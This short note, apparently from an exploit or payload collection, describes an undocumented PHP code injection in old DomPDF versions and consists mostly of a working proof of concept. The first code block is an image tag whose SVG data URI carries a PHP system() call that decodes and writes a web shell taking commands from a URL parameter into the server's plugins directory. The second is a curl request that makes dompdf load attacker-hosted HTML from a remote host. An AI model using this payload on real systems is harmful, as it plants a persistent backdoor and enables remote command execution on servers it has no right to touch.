# DomPDF PHP Code Injection
It appears that old versions (~0.6) of DomPDF has an undocumented PHP Code Injection.
Exact version could not be identified.

```
<img src="data:image/svg+xml,<svg%20xmlns='%68ttp:%2f/www.w3.org/2000/svg'%20xmlns:xlink='%68ttp:%2f/www.w3.org/1999/xlink'><image%20xlink:hr%65f='%68ttps:%2f/leaking.via/svg-via-data1'></image></svg><?php%20system('echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= |base64 -d > /var/www/approot/plugins/ptCRfR0VUWydj.php');?>">
```

```
curl "http://vulnerable.com/plugins/dompdf/dompdf.php?base_path=http://raw.github.com/repo/leak.html&options[Attachment]=&input_file="
```

[See leak.html for PoC](./leak.html)
